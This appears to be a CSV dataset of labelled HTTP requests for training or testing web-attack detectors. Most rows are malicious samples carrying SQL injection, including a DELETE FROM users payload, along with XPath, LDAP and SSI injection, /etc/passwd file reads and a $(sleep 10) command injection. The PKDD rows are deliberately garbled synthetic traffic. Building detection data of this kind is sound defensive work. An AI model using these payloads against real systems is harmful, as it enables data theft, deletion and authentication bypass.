attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
SQLi,medium,3.0,malicious,"POST /jdD7XYX/mmyar5hcAex/ER29@pde-14Jn5/4JhahhtEXPahg5h7tl/awi35azeees6nrT8/4nrUrQ.D@t_VlVzM1R0L/TqscriptjoXObQ/EAtd4ExtaOi6soilThsc/noyEi4vheqyeriDlnnNI.php? HTTP/1.0
Content-Length: 336
Content-Language: Esrb2
Content-Encoding: identity
Content-Location: /rumio/r9lul/2zSe/nemEo.msf
Content-MD5: cmg2aU9yT3RkdG50NGRxVQ==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 23 Dec 08 12:19:46 GMT
Last-Modified: Wed, 15 Mar 06 15:57:50 GMT
Host: 113.228.161.82
Connection: keep-alive
Accept: text/plain;q=0.1, video/quicktime
Accept-Charset: *
Accept-Encoding: *;q=0.1
Accept-Language: *;q=0.5
Cache-Control: waT4b='zl'
Client-ip: 182.0.7.148
Cookie: C@PhEwIPA=804;eeaaaum=sUpiFerhce2ntqJhRw;ami6=tlzioAlayoynrcpske
Cookie2: $Version=""30""
Date: Wed, 07 Apr 04 13:17:01 GMT
ETag: ""8SIu.AFvTvU3KcHdVRD""
Expect: Nerh01=hehmt9
From: nfie@aaskkmo.com
If-Modified-Since: Sun, 16 Oct 05 11:50:51 UTC
If-Unmodified-Since: Sat, 08 Jan 05 01:10:38 CET
If-Match: ""i0lMN13R6YQQ4FIYKY""
If-None-Match: *
If-Range: *
Max-Forwards: 45
MIME-Version: 2.2
Pragma: no-cache
Proxy-Authorization: NTLM dG9ub1NydW50OUF5YWJudHluc3RhQnphaHB1d2l6dmFkaTRGdmlobnM=
Authorization: NTLM ZVNkNTFPaGFlb2FOcWo3ZWxycXF1bGhTbjMzYnRPNmc5aWt4bXBFSWVuY3dlb3Vu
Range: -49879
Referer: http://www.thh1hi.st/Nxrye/Ceiwb.tiff
TE: deflate,trailers,chunked
Trailer: Accept-Language
User-Agent: twiaA (awu6fOs; up0169y.; nyMqAisU)
UA-CPU: 68000
UA-Disp: 320,3937,32
UA-OS: Windows NT
UA-Color: color32
UA-Pixels: 2355x6440
Via: HTTP/9.8 www.satzss.jpeg, 8.9 76.207.155.25:1, 1.7 212.253.176.243
Transfer-Encoding: deflate
Upgrade: nto/6.6, ero7er/3.3, Axmpf/2.4
Warning: 930 168.40.198.240 ""aetrpi0rwwtHsS"" 
X-Forwarded-For: 85.56.154.10
X-Serial-Number: 3067055271
----: ----------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~

qzGnaesa=c-mlpG&enoludnfnpymnd=sab&ndetNauti=wYscript&itp7iowledbysaO=+Mcriyposition$eogD@:&ieoos=53inph-V&acioRs2pONeeirt=flaHewimyfa&ue0t6a0t=0wlroawests&gtttSZrwa=8femeat&daa1aete=093173969&6mleeigndsrliq='    OR   'cmfbciu'     =     N'     &nitlnfaEotemfe= oz[t7w end7szl5rd&smie4niuaabn8=usiw&irx09f4epsnic=158",41378,2157,xml_test-41378,pkdd,
Path Traversal,medium,,malicious,"POST /search HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

search=\\&apos;/bin/cat%20/etc/passwd\\&apos;&id=2111",,222,patt-path-traversal-1111,PayloadsAllTheThings,\\&apos;/bin/cat%20/etc/passwd\\&apos;
SQLi,medium,3.0,malicious,"PUT /5Dn-/-zDD2CZin/ntmeopntllsdUiacis/rsctrl/omeH2ppea3nsptt4/l.y_93g/tsedek/hNPdwV0J@Zr/aa5Et5os1sle/quDumiLJKrf_-yMQLf8k/Oimh/Dge78aHESR.shtml? HTTP/1.1
Content-Length: 198
Content-Language: s,eePl
Content-Encoding: identity
Content-Location: http://www.seejohhb.ch/htdaankl/yl6ecxIL/4ngnseT/iavsmS4g.exe
Content-MD5: R2NzaWN1RnRuZWF0dHF0aQ==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 13 Jun 07 15:05:43 GMT
Last-Modified: Mon, 30 Oct 06 19:59:16 GMT
Host: www.Uesfpe.st
Connection: untepeh
Accept: video/*, image/*;q=0.5
Accept-Charset: *
Accept-Encoding: *;q=0.6
Accept-Language: *;q=0.0
Cache-Control: max-stale
Client-ip: 57.72.9.173
Cookie: ohtagH1i=7545956;dteSmDey7=3lshutdowndivh;7cthoYuIeehey=tnshrrJ'   );DELETEFROMusersWHEREupper(username)   =  upper(  'admin
Cookie2: $Version=""467""
Date: Sat, 19 May 07 17:39:33 UTC
ETag: W/""D6SYDo5YCkMgqXZPzEv""
Expect: 100-continue
From: lnd9clwh@rteetb.st
If-Modified-Since: Sat, 29 Sep 07 22:31:10 UTC
If-Unmodified-Since: Tue, 25 Apr 06 05:01:25 GMT
If-Match: *
If-None-Match: ""AjxqTKj8fiWmMs5C9Hf""
If-Range: *
Max-Forwards: 8794
MIME-Version: 0.6
Authorization: NTLM ZHZyZG5vY1R0dGFuYWVtaWdRZW1lenpkb3d0cGduT2ZyNg==
Referer: http://www.cf9s.com/Rimesej/3Oyv.avi
TE: trailers
Trailer: Range
User-Agent: Mozilla/0.5 (Machintosh; U; PPC Mac OS X 6.9; ag-ne; rv:7.3.4) Gecko/26671390
UA-CPU: MIPS
UA-Disp: 257,411,8
UA-Color: color8
Via: HTTP/4.5 83.84.111.27, dlRe/3.0 124.148.188.163
Transfer-Encoding: 6muu; vvnan1lt=edys
Upgrade: wio/7.9, nnng/7.1, s21rm/9.9, ondtA/4.0
Warning: 217 205.143.169.131:4848 ""rcewtIuproezsetnh"" ""Fri, 20 Mar 09 22:34:04 UTC""
~~~~~: ~~~~~~~~~~~

fcA81Rlinheh=2&ebNTQletnaacvdt=4oaa&ygOl5ed=92017&losoeLTLlJbnv=9nesoyes&ri5ex8=open iexeci3e$$&ghr6ht1sz=U1ttcd0aryis&JIadminOQhzE=42822&Ona27Ej=euN o&ettrnznio=8005989&da=<as&2izoceihe=edezi",42736,1885,xml_test-42736,pkdd,
SQLi,medium,3.0,malicious,"PUT /nx3L@nEUMu79yzbtggP/gh/fSdtr8xPmQ6iT49OPJiq/r7naisaloss/ABRaS69IAGd5/sol8asuppeOn/ryeoassfaert/uegoIxwt-68b/nTsZPVgq/oZeSuqa9j1bqA/fhBt.shtml? HTTP/1.1
Content-Length: 251
Content-Language: jierad,sexk,ucfcaae
Content-Encoding: identity
Content-Location: http://www.A3thaoAe.be/oibR/asei/3eAa/Ssrixe.asmx
Content-MD5: bWQyb296ZUhtb2lzU3dobw==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 24 Oct 09 06:14:06 CET
Last-Modified: Wed, 13 Jul 05 02:34:29 CET
Host: 33.150.139.230
Connection: close
Accept: video/quicktime, audio/x-wav, text/*
Accept-Charset: windows-1252, x-mac-cyrillic, x-mac-chinesetrad, windows-1251
Accept-Encoding: identity, compress;q=0.6
Accept-Language: steT1cL-tt8jdmr;q=0.3
Cache-Control: no-transform
Client-ip: 48.186.187.130
Cookie: QkXmb_=OR 'y7wb2'    BETWEEN    'R' AND    'T';ti=tn(4aOaahomervn ~t[sgoc;mgnhdhks=atdbfr?@mvretr7n
Cookie2: $Version=""00""
Date: Tue, 02 Mar 04 09:52:38 UTC
ETag: ""WF4A4@FXbzWEO3h-""
Expect: dpiit9td
If-Modified-Since: Sat, 21 Feb 09 02:57:22 CET
If-Unmodified-Since: Tue, 07 Dec 04 05:29:38 UTC
If-Match: *
If-None-Match: ""iBiv.hMdAuFY1jav""
Max-Forwards: 9179
Pragma: aix0wrs='d4Ii'
Proxy-Authorization: 1oi2hy rTepl=hneaC
Authorization: Basic eWFlOGR1b3Q6dXJjaHYz
Referer: /0orthr.avi
TE: trailers,chunked;q=0.2
Trailer: Authorization
User-Agent: Mozilla/0.4 (compatible; MSIE 1.3; Open BSD i586; orac)
UA-CPU: PowerPC
UA-OS: FreeBSD
Via: 5.0 www.c9hhu.tiff, 9.2 53.121.42.217, 8.5 134.106.105.31
Transfer-Encoding: gzip
X-Serial-Number: 58260161
----: ----------------------------

ApLLKra=entsonad1aee &oc=cseat&hbut=8184744942&Nenf=|lsbs&a3mrsec832nrh=802&rrm2oltEisooe=l;qfhr4asI-ekm&FbA8sR4BO=wtdehbsSivhd&_dLSOQ=udnfl]savr(yRytt&heubleve=5755050&GLN-7_7CcDphp5=5iqxl&recr=3ntetcr&rdliNelO=tt$&yt0vw9hretrheo=ewgetet]",42771,1845,xml_test-42771,pkdd,
Command Injection,medium,,malicious,"POST /cgi-bin/test HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: close

ip=$(sleep 10)&trace=1016",,0,kaggle-cmdi-016,KaggleWebPayloads,$(sleep 10)
,hard,-2.0,benign,"POST /iaV/salp/i1l3DUG_ZfD/rUX9uIQxWSIXSee4Glge/-YlNJbinumH4/nd0QdUU0z1Yp-FxKJF.css? HTTP/1.1
Content-Length: 252
Content-Language: daar,irr
Content-Encoding: compress
Content-Location: http://www.etsoj.ch/oe7seP/bkzpAiat/o8np.shtml
Content-MD5: dHlJbGVZbmRlbm1nT21Eeg==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 17 Jan 08 06:21:18 UTC
Last-Modified: Mon, 14 Jun 04 11:46:38 UTC
Host: 93.177.210.128
Connection: l2oT
Accept: text/*
Accept-Charset: x-mac-korean, x-mac-hebrew, x-mac-turkish, x-mac-arabic
Accept-Encoding: 
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 229.106.129.24
Cookie: a2dasrelQlsot=u;irhtalenmonsen=otIez;hfr6im=47665833;Toeoaot=5076915994
Cookie2: $Version=""00""
Date: Sun, 08 Mar 09 11:12:09 GMT
ETag: ""W6RIxcRFJaUsrHepwgOU""
Expect: 100-continue
From: ol8k@oiren.st
If-Modified-Since: Tue, 29 Mar 05 20:05:11 CET
If-Unmodified-Since: Sat, 11 Nov 06 22:24:56 CET
If-Match: ""6gJ6zxAjsLt5aUjWoNI""
If-None-Match: ""-EKiJU11uKCir9FMjodf""
If-Range: *
Max-Forwards: 3
MIME-Version: 9.1
Pragma: no-cache
Proxy-Authorization: sahe tsshe=ajtnobe
Authorization: NTLM cnFpMzNzSGJoZG9ob3VhYWF0clRyYWVyZnR0YWVpNHN6elhl
Range: 713-,7885-54
Referer: /u556ba/rtnntm/rOlnntr.shtml
TE: trailers,trailers
Trailer: Authorization
User-Agent: Mozilla/3.0 (Windows; U; Windows NT 9.0; jr-oa; rv:2.8.9) Gecko/49199662
UA-CPU: x86
UA-Disp: 892,7658,8
UA-OS: Linux
UA-Color: color32
UA-Pixels: 995x590
Via: 6.4 www.ifmonntr.css
Transfer-Encoding: deflate
Upgrade: r9e3sj/2.9, ssde/1.5, 28o5l/1.1, cra/1.9, oir/5.1
Warning: 026 www.euaepe.tiff ""E1ssmoL4mnehtgAslnrW"" 
X-Forwarded-For: 124.239.210.255
X-Serial-Number: 8391965
----: -----------
~~~~~: ~~~~~~~~~~~~~~~~

L4ySMqKHgOK_=2OO5YSbY&tyRocees6eoknfa=lhttps&U5piGu=6430297&eTi=Doa=&sbddsmngn=391643&veoAidolti=260&a9zet=tie&l8asc=iNZlrd&nteSa=ePEz&lXYdp0gP=vYw3ttAi/i>tasa(l[s+&8Qniaroi=86679450&ZeNoqVw1ql4iframe=pnwindow.openLn&eEmpehene2ee3ai=8373236",34164,1990,xml_test-34164,pkdd,
XPath Injection,medium,4.0,malicious,"GET /tfih3dmdiat9ts.cfm?8tiueetosli4h4=995876009&de1ewtlieei8=Edwy&HUlato=eO%5Csiyynbgtu&xyhehenk=iRBwg5NG&aiw=rinnetcat&62ciEdOruenl=e4Ko&w3DOlibygFLphp=%7C1s+bE+o%29T-Aysn&k7IZa=6leooidirigNtad&oTdSdwns=s%29&iz=JsltjLefao&bbcgginf3i5oe=rrw0Uegr5NsoeRari&aei=avge%24&Inmd=98022&pnei9POratyo=7223 HTTP/1.0
Host: www.itetea.cz:635
Connection: keep-alive
Accept: text/*
Accept-Charset: iso-8859-8;q=0.7, x-mac-hebrew;q=0.7, x-mac-ce;q=0.3, windows-1251;q=0.8
Accept-Encoding: *
Accept-Language: cd-etpt;q=0.1, az-ho6Isto6
Cache-Control: no-cache
Client-ip: 71.50.53.20
Cookie: a1setnfgdt=lOR;endneq5=miyoShcutEanzugta;o0=rea8h8d']    |  P    |    //user[   name/text(    )   =  'so
Cookie2: $Version=""2""
Date: Fri, 25 Nov 05 20:34:41 CET
Expect: 100-continue
If-Modified-Since: Sat, 15 Aug 09 16:40:53 CET
If-Unmodified-Since: Sun, 11 Dec 05 19:03:11 UTC
If-Match: *
If-None-Match: ""JBhl9pWIN7AfmTCvS7l""
If-Range: Fri, 28 Jul 06 12:16:10 GMT
Max-Forwards: 51
MIME-Version: 8.5
Pragma: a=ctp7Enwn
Authorization: NTLM bHNyVWFlb25wZXdrYTJOZGFENHNoaWVvdXBwbWVkdGxkZ1dpdzl0M2o=
Range: 76101-
Referer: http://www.eici.de/zissoays/oeybmpL3/rebanhT/rpWao/mir1r.php
Trailer: Upgrade
User-Agent: Mozilla/5.8 (Windows; U; Windows NT 3.0; ti-no; rv:6.5.1) Gecko/52466185
Via: 0.4 71.64.1.77
Transfer-Encoding: deflate
Warning: 037 www.ramdut.png ""awsh"" 
X-Forwarded-For: 70.179.167.130
----: -----------
~~~~~: ~~~~~~~~~~~~",35501,1440,xml_test-35501,pkdd,
XPath Injection,medium,3.5,malicious,"POST /Lncem40isjnNln/dlb6e0ermoditmes/4K8Z/jqp0M4IgmCu/nz/Ao73luIXD@/t-BmkELiSa/eT3Il8binputtxml17Etz/fsaU2etusit/an4shessssjaiSeic5bd.mdb? HTTP/1.0
Content-Length: 244
Content-Language: mbetseh
Content-Encoding: deflate
Content-Location: /aaiwmgua/it0os/hrWDfe/nalqdm2e/Deashngn.shtml
Content-MD5: SGJtaHRzdGV0ZWxPeWdocw==
Content-Type: application/x-www-form-urlencoded
Last-Modified: Wed, 12 Apr 06 14:04:29 UTC
Host: www.c1ettDcd2m.com
Connection: mgpg7d
Accept: image/*, application/x-tar;q=0.0, text/plain
Accept-Charset: iso-8859-1, x-mac-cyrillic
Accept-Encoding: gzip;q=0.7, deflate;q=0.5, deflate, identity, gzip
Accept-Language: *;q=0.2
Cache-Control: no-transform
Client-ip: 88.57.0.63
Cookie: IE5m=emetd;9etad1ye=eval ;ganrqeosr=qu;akiaccess_logR8passthru=eoeoset']    |   P |    //user[     name/text(   )   ='Hjfpv
Date: Mon, 13 Sep 04 12:11:40 GMT
ETag: ""CgWrOYRDBY9fQlI""
If-Modified-Since: Sat, 14 Jun 08 09:50:44 GMT
If-None-Match: ""_ZXpXPJgeVyRCxjFSP""
If-Range: *
Max-Forwards: 23
MIME-Version: 1.8
Pragma: rrzxOgma=aesoRyhk
Authorization: Basic c3RpcGJtZTpUU254YXR4Mw==
Referer: /nogsdaoh/oOedde/cgphuai.mpeg
TE: deflate;q=0.7,deflate,gzip
User-Agent: dh9lel (9M8AaubBj; rP.IwPWS-K; eLH@yg)
Transfer-Encoding: deflate

eyanetoAws5oc=wj&wSgoit=yrcistwtpoo&icdstse=aiqgxpzK&lnhuedcaulxcofe=LneaN7rIn&61t=ptllogermochaa \r&xu59N2f-=tt5treLepnshutdown&dewmq4sewinSu=36320004&ols=9422&758neTo=mJ6gFP&ewi=q&tdninos=74148346&ieputs=iam&iei=993746810&oamtsleMe9In9t=eee",50076,1512,xml_test-50076,pkdd,
SQLi,medium,3.0,malicious,"GET /nwP.zT_vG603NW9ipTcF/a6/xeoaGtBespofee6sy/sTD@rgeocBExRO7@@x/rwoTI0k6G.jI5ETn1/fhyrwh/iYK-eFz17s-0a/sPZ8B5K5R-kBib5O/crtlptioayrE/v@YxUUSsIYGw4rsock_stream.gif?bnh=lixl%3Fqa0s4%7CsmailSna%24fha&5nqoohaoceCwo=746&xew=58312423&ohlooudegn=330&cWXEGaYxmS8i=hiquy%3A%3D%29g6kc7m&sninseaS6fge=isnte%24nrw%29d7te&optd7documentPT2BC=6&mhU=%27select+customer_phone+%27%7C%7C%27from+customers++%27%7C%7C%27where++customer_surname%3D%27%27%27%7C%7C++++lv_surname%7C%7C%27%27%27+and++customer_type%3D1%27%3B&ebeeh9aehisr=89&plrttwSodih=A&et6hnaehottarzo=19 HTTP/1.0
Host: 168.246.109.222
Connection: close
Accept: video/mpeg
Accept-Charset: *;q=0.6
Accept-Encoding: *;q=0.6
Accept-Language: et37i-woa, o-usrs1sr;q=0.4
Cache-Control: max-stale
Client-ip: 172.68.108.190
Cookie: rgsehrtnl3EaR=375728;yhea=j vls2apshsnullNformc;tnUeN3ednErtN=be.;epiof=8Ae
Cookie2: $Version=""46""
Date: Tue, 24 Aug 04 14:03:53 GMT
ETag: ""zWjqHOL2ecS3XXB""
Expect: 100-continue
From: lhrrhh9j@48Flats.biz
If-Modified-Since: Fri, 26 Oct 07 08:20:18 UTC
If-Unmodified-Since: Sun, 24 Jan 10 12:27:10 CET
If-Match: *
If-None-Match: ""SDSPQP06P2nd1XtnJY""
If-Range: ""e2Ju.ac4fHkdh3jyVE.""
Max-Forwards: 83
MIME-Version: 8.6
Pragma: hohu=eOrbE
Proxy-Authorization: Digest nonce
Authorization: 5hra 0ytzc=3ariec
Range: -256
Referer: http://www.y1rmzE.uk/atdr.bin
TE: gzip;q=0.4
Trailer: Host
User-Agent: Mozilla/8.2 (Machintosh; U; PPC Mac OS X 6.5; nd-hn; rv:7.2.3) Gecko/24179394
UA-CPU: MIPS
UA-Disp: 7502,392,16
UA-OS: Solaris
UA-Color: color8
UA-Pixels: 307x472
Via: 7ee/6.1 196.216.120.158, FTP/0.0 www.1tmhapa.html, 6.7 163.28.121.133:7083
Transfer-Encoding: hh8e
Upgrade: Ens/2.7, ieoa/3.9, 4tt/2.8, ind/4.0, sute/1.0
Warning: 264 99.10.30.250 ""a0gtsj1ecytcw5Eqrc"" 
X-Forwarded-For: 206.224.167.230
X-Serial-Number: 001394948859071824
----: ------------------
~~~~~: ~~~~~~~~~~~~~~~~",42051,1893,xml_test-42051,pkdd,
SSI,medium,5.0,malicious,"GET /Oe8e1cttitihbe/ute/elAaiseoln/msVKIkm9/ToaFegl3c3bb.asp?4ynmies0jnl4=8lt&ntcLs=+e6&dali3a7bsiFetdt=7UvKnzPbRX&R@UincludeWfBd=6590905&tnt0hmccnntiih=lrclotT18ouqeaen&nnbeqetoOhssfa=qEgMMU%40RuOi&an0wed5=%5C%2Bwasu&auiNddyn=++cUhome%24%28%28sconnectutena97e&sgZ8=+l&hgs1etlahRmmohr=00271&Ypl1all5E7qLg=45751&jpositionhF=3a4&ma=4005 HTTP/1.0
Host: www.inho.be
Connection: close
Accept: audio/*, text/*;q=0.8
Accept-Encoding: 
Accept-Language: Wliabgor-Opeep, z-1cVtompy;q=0.8, Btnlr-le;q=0.2, ea-t3e
Client-ip: 220.104.64.235
Cookie: cFaFSo=eaI%U@;tteoeidrbiee=5721967369;SlovvaeeosAsTl=<!-- #include   virtual=""d:\windows\autoexec.bat"" -->;z9qwbbrm9hdgaaa=a0rABe2uhsGose4an;oiD=4491
Date: Sat, 20 Sep 08 01:20:41 GMT
ETag: ""K4eepBzju4rF2UhlrnG""
If-Modified-Since: Sun, 31 May 09 16:24:57 GMT
If-Unmodified-Since: Tue, 27 Apr 10 23:00:59 GMT
Max-Forwards: 525
Pragma: tmfFi0t=xsgOLeys
Referer: /katt/eectae/eequft.php4
User-Agent: Mozilla/5.5 (Machintosh; U; PPC 2.8; hd-ye; rv:4.2.0) Gecko/71689050
Via: 3.6 129.92.164.217, 2oA/3.4 235.41.55.205, FTP/2.0 www.rpgypPe.html
X-Forwarded-For: 115.42.201.75
----: -----------------------------------------------",40394,1177,xml_test-40394,pkdd,
LDAP Injection,medium,3.5,malicious,"POST /rjY2A8.-cr1y3ZX/fsrtmE8tnebutmaoaz/m99WKTF/jBu-7U5L1G5rqk5/xtPE@c-Qhtb/eMWo0d_IdrzivCH6mMFK.jpg? HTTP/1.0
Content-Length: 113
Content-Language: dGl4ty,dxzOpms6
Content-Encoding: compress
Content-Type: application/x-www-form-urlencoded
Last-Modified: Mon, 09 Apr 07 01:01:44 GMT
Host: 81.230.179.135:80
Connection: ymbin
Accept: audio/basic, audio/x-wav
Accept-Charset: iso-8859-7
Accept-Encoding: *;q=0.0
Accept-Language: 3qpEOy-ahit;q=0.8, n-aycmhtNn;q=0.6, e-ii, dAvsdwWo-tmxnaohE, deicGynr-ur
Cache-Control: m1IT='iesrf'
Cookie2: $Version=""851""
Date: Sun, 12 Jul 09 10:35:52 CET
Expect: 8mpesG7
If-Modified-Since: Wed, 08 Dec 04 01:45:10 UTC
If-Unmodified-Since: Fri, 03 Jun 05 17:23:58 UTC
If-Match: *
If-None-Match: ""eS7uwhXzfnEMKQxMV8m""
Max-Forwards: 520
Authorization: Basic cnJpYjpuTTJnc0Jv
Referer: /neFifm/tefTa/npni/9ok6sv/iidirst.mdb
TE: trailers,trailers
User-Agent: szcBd- http://www.awSMeczh.ch
Via: FTP/5.1 137.160.212.178, FTP/2.2 www.a6taei3d.jpg
Transfer-Encoding: hEjcm; MeyrA=8sno
Upgrade: lnd/9.2, toL/2.4
----: ------------------------------------------------

OsREAWusrs7PFE=8wW&edctt='snetcatw&noszNlpuxelos1=5h)(&(objectClass=   t6o*)&9eRafsibrsjie6g=pCzk3q",37723,1219,xml_test-37723,pkdd,
SSI,medium,4.0,malicious,"GET /ilipsa/iapbioiw.shtml?shutdownQ0vbK2iY0C=eeArpO&oeIbnn1l=13053&hseeTxa=35786&smrtev5e=58787&m5nwueritjee=59&G1froma0aY=9779212196&eEacsh=at6urhttsmwfabo&nymfnaboenlrF=atpassthru HTTP/1.0
Host: www.TdZc.biz
Connection: keep-alive
Accept: video/quicktime
Accept-Charset: *;q=0.6
Accept-Encoding: deflate
Accept-Language: Ohrrh-neab
Cache-Control: min-fresh=8412
Cookie: wpOtIC8gchild.bo=jraFemtfoe8cedo6m;yvehoaI=<!--  #include   virtual=""/etc/httpd/httpd.conf""  -->;ytire5xrNw=oelsock_streamDec';egutnlm=EtoPntnObiAbp;OaYK6qkvTC=cNaeaj;4aCZkdropyhRNp=iIoalg""eDfeo;v
Cookie2: $Version=""6""
Date: Mon, 03 Mar 08 21:47:46 GMT
ETag: ""TfPCX0b-4egAHpkl""
Expect: 100-continue
From: ratp@hrud.cz
If-Modified-Since: Mon, 29 Dec 08 17:04:48 GMT
If-Unmodified-Since: Fri, 15 Jan 10 24:37:11 CET
If-Match: ""DvISLX9H6xMhFl3r_vCO""
If-None-Match: ""XdHmZl8.zhVDbotxuY""
If-Range: ""IJX-0Fvv9W-tNWUbzo""
Max-Forwards: 52
MIME-Version: 8.9
Pragma: no-cache
Proxy-Authorization: Digest qop=ioTsdw3n
Authorization: NTLM emFpZWlyYW9vc21uZWVpbHJhZXdjZW81YUllTHNlZWFybWhmcmE2dG9hc2U=
Range: 649-,-625813
Referer: /otxeyxs.html
TE: trailers,gzip;q=0.8,trailers
User-Agent: affzyldtwo (i@eOG8q2; uque82c1n; trboDp@t; spPDCoBad; bp5.tdV7BX)
UA-Disp: 147,913,8
Via: HTTP/7.7 200.160.25.99:27000
Transfer-Encoding: 7nalt; qen5sri=eapdd2Le
Upgrade: oin5d/6.0, 4EHtc/7.8
Warning: 643 www.Of6an7hu.tiff ""ahmCgzcJ"" ""Thu, 08 Oct 09 18:26:52 UTC""
X-Forwarded-For: 81.239.118.138
X-Serial-Number: 219629
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",39525,1586,xml_test-39525,pkdd,
SQLi,medium,3.0,malicious,"GET /uAG-f/pMeYsdaEbWO_YGs/wgetselectIW4/hrnk3dimc/n3aurOkonpaov.bin?hhb=p+fi&rzuddng9rtn6e=543213&CnhpO=f7sfamo&eonOidNhtsnwu2w=v2qvso&zicmdDVQ1=0&catijsock_stream8X_NvGis=lixr&izu-4=wei&oh8jojnddor=oeg&pz8GIsya1LrR=wtbowinntpAnetcateupdateujr&yilrYbeibGnmamt=60070297&riunr=idcsock_streamlinkwl&xt=r0r-&msn9bn=jnvnyraohs HTTP/1.0
Host: 172.152.15.163
Connection: keep-alive
Accept: image/jpeg;q=0.5
Accept-Charset: us-ascii;q=0.9, utf-8, windows-1257
Accept-Encoding: identity;q=0.6, deflate, gzip;q=0.1, gzip;q=0.1, compress;q=0.2
Accept-Language: '    OR     'le1' LIKE    'aze%25
Cache-Control: no-store
Client-ip: 151.63.160.140
Cookie: Zechl8d=mGsosrepat0i;KM-Bbt4nIlocation97=qr1tAt5oiesfr>h;wheredTZYvMpwhere=-bealleacnnaSl;8RQROE3i@RD=vcU_pd6
Cookie2: $Version=""0""
Date: Wed, 21 Sep 05 08:53:45 CET
ETag: ""ThY1cTTEqxmOVuYl""
Expect: sfaoe7t=eotaah
From: enng6@dnse.biz
If-Modified-Since: Sat, 31 Mar 07 06:30:22 GMT
If-Unmodified-Since: Sun, 11 Dec 05 13:06:08 CET
If-Match: *
If-None-Match: ""ceix1PT.YXfQIG7""
If-Range: ""kYzYHV1khiCHsYn-""
Max-Forwards: 179
MIME-Version: 2.7
Pragma: dqp7='ruN'
Proxy-Authorization: Basic dGxzUDpoZW92aQ==
Authorization: sda5A h990hii=Siyhyle
Range: 5154-283,-781,-71
Referer: http://www.r2at2.net/5gey/azattehq/0etp/ceahslh/tnBods8.exe
TE: gzip,trailers,trailers
Trailer: Date
User-Agent: Mozilla/4.6 (X11; U; Open BSD i586 4.8; hc-tn; rv:4.4.4) Gecko/47304278
UA-CPU: MIPS
UA-Disp: 8221,0714,8
UA-OS: Mac OS X
UA-Color: color8
UA-Pixels: 724x926
Via: 8.9 9.233.143.28, 3.9 213.69.175.21, 4.4 143.168.216.31:1
Transfer-Encoding: identity
Upgrade: sbssn/4.1, imo7o/6.7, etiif/1.0, tss2b/2.2
Warning: 570 20.88.197.170 ""eeqmmpr1httetaoyox"" 
X-Forwarded-For: 105.89.56.0
X-Serial-Number: 7584461693588
----: -------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~",41186,1855,xml_test-41186,pkdd,
LDAP Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
Connection: close

name=query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))&id=1170",,255,patt-ldap-injection-0170,PayloadsAllTheThings,query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
LDAP Injection,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close

comment=(&(sn=administrator)(password=*)) : OK&id=1186",,211,patt-ldap-injection-0186,PayloadsAllTheThings,(&(sn=administrator)(password=*)) : OK
